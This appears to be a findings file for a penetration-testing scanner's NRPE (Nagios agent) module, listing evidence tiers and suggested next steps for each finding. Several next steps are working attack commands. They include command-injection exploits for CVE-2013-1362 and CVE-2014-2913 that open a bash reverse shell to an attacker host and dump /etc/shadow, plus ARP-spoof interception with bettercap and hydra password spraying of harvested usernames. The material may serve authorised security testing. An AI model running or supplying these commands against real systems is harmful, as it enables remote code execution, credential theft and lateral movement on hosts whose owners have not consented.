summary: Deep NRPE probe. Reachability + protocol facts (plaintext, anon-DH TLS, CRC32 integrity, version, cert extraction) are T1. Command enumeration + user/hostname/OS harvesting from real check output push into T2 (controlled queries extract real data). The two RCE probes (CVE-2013-1362 arg-injection and CVE-2014-2913 LF metachar bypass) are proper T2 — send a controlled marker, verify it echoed back through a shell context. Gated behind active_rce. Missing: no follow-on to a shell/creds capture, no PSK/pre-shared key discovery. cve_2020_6581_version is version-only.

findings.tier_evidence: _NRPE_CHECK reply parsed — proof allowed_hosts admits the scanner (no auth in base protocol).
findings.promotion_notes: Baseline — depth is in the companion findings.

findings.title_pattern: NRPE traffic in the clear (no TLS)
findings.promotion_notes: T2 = on-path capture of command output (user lists, process argv), verified via replay. Requires L2 access.
findings.tester_next_step: tcpdump -i any -w nrpe.pcap 'tcp port 5666'; replay captured queries to correlate with legitimate check output.

findings.title_pattern: NRPE v2 packet integrity is CRC32 only
findings.tier_evidence: Implicit from v2 speaking — no MAC in the protocol.
findings.promotion_notes: Protocol-level fact; no probe promotion available.
findings.tester_next_step: Note the protocol-integrity gap for the customer report; combine with plaintext for on-path recommendation.

findings.title_pattern: NRPE TLS uses anonymous Diffie-Hellman (no server auth)
findings.tier_evidence: TLS handshake succeeded with cipher name starting 'ADH' — deterministic.
findings.promotion_notes: T2 = MITM the anon-DH session (bettercap/mitmproxy) since server auth is absent. Requires L2.
findings.tester_next_step: openssl s_client -cipher ADH-AES256-SHA -connect <ip>:5666 — confirm; then bettercap arp.spoof + intercept.

findings.tier_evidence: CN/SANs regex-mined from DER — enrichment only.
findings.tester_next_step: openssl s_client -showcerts -connect <ip>:5666 — cross-reference CN/SANs with other TLS surfaces.

findings.tier_evidence: Any reply from scanner IP is deterministic evidence allowed_hosts admits it.
findings.tester_next_step: check_nrpe -H <ip> -p 5666 -c _NRPE_CHECK — then run the CVE-2013-1362 arg-injection probe.

findings.tier_evidence: Actually invokes each check_ command and records its output — controlled queries returning real data.
findings.promotion_notes: T3 = attempt $ARG$ substitution on every enumerated command (not just the first) to widen the CVE-2013-1362 surface; some check_ commands take -a and are vulnerable while others aren't.
findings.tester_next_step: for c in check_load check_disk check_procs check_users; do check_nrpe -H <ip> -p 5666 -c $c -a 'x$(id)y'; done — grep for uid= in reply.

findings.tier_evidence: Presence of check_mysql/check_pgsql/etc implies the service — inference, not a live confirmation.
findings.promotion_notes: T2 = invoke the check_ command to actually confirm the local service state (check_mysql returns 'Connection refused' vs 'Access denied for user') — turns inference into confirmation + version.
findings.tester_next_step: check_nrpe -H <ip> -p 5666 -c check_mysql — parse for MySQL version/access-denied to confirm localhost:3306 is live.

findings.tier_evidence: check_users/check_procs output parsed and real usernames captured.
findings.promotion_notes: T3 = spray captured usernames against SSH/SMB/LDAP/RDP with a small wordlist; folds into cross-service known_users which the sprayers already consume.
findings.tester_next_step: hydra -L nrpe_users.txt -P rockyou-top100.txt -t 4 -f ssh://<ip>; also ldap/smb spray.
check_nrpe -H <ip> -p 5666 -c check_hostname — feed to Kerberos-realm inference.
check_nrpe -H <ip> -p 5666 -c __recce_nonexistent — plugin path in error localizes distro.

findings.tier_evidence: Version compare only; module explicitly does not trigger.
findings.promotion_notes: PoC would crash the monitoring-server-side check_nrpe (client-side); not worth automating.
findings.tester_next_step: Note version; recommend upgrade. No safe automated PoC.

findings.tier_evidence: Marker RECCE_NRPE_RCE appeared in the reply — proof shell metacharacter substitution into exec context. Gated behind active_rce.
findings.promotion_notes: T3 = reverse shell via bash -i >& /dev/tcp/…, then id/uname/dump ~/.ssh. Documented as tester_next_step per user directive.
findings.tester_next_step: check_nrpe -H <ip> -p 5666 -c check_users -a 'x$(bash -i >& /dev/tcp/<lhost>/4444 0>&1)y'; also `-a 'x$(cat /etc/shadow)y'` for shadow dump.

findings.tier_evidence: LF-only marker echoed back — proves incomplete 2013 patch, shell exec confirmed. Gated behind active_rce.
findings.promotion_notes: Same T3 promotion path as arg_injection_rce — LF variant works where the ; sanitizer blocked $(…).
findings.tester_next_step: check_nrpe -H <ip> -p 5666 -c check_users -a $'x\n bash -i >& /dev/tcp/<lhost>/4444 0>&1'; grep uid= in reply for confirmation.
